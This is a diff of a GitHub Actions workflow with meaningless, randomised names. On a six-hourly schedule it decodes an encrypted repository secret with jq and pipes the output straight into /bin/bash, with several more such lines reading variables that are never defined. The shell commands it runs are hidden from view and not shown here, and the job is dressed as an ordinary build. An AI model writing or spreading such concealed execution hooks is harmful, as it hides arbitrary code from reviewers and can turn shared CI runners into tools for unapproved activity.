@@ -1,20 +1,24 @@
 name: longshuangfang4513
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '24 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: longshuangfang4513
         env:
-          kkyif121: ${{ secrets.kkyif121 }}
+          kwir056: ${{ secrets.kwir056 }}
         run: |
-          echo $kkyif121 | jq -r .s61036 | /bin/bash
-          echo $ykmdw63933 | jq -r .wiog916 | /bin/bash
-          echo $x1 | jq -r .uhs41136 | /bin/bash
+          echo $kwir056 | jq -r .zmh45940 | /bin/bash
+          echo $cmc45 | jq -r .fa41904 | /bin/bash
+          echo $xx6005 | jq -r .ggae08 | /bin/bash
+          echo $kozlj99 | jq -r .cwnb7 | /bin/bash
+          echo $zzjak3885 | jq -r .dpn62131 | /bin/bash
+          echo $til803 | jq -r .qqnu289 | /bin/bash
+          echo $cx82215 | jq -r .t45631 | /bin/bash
 
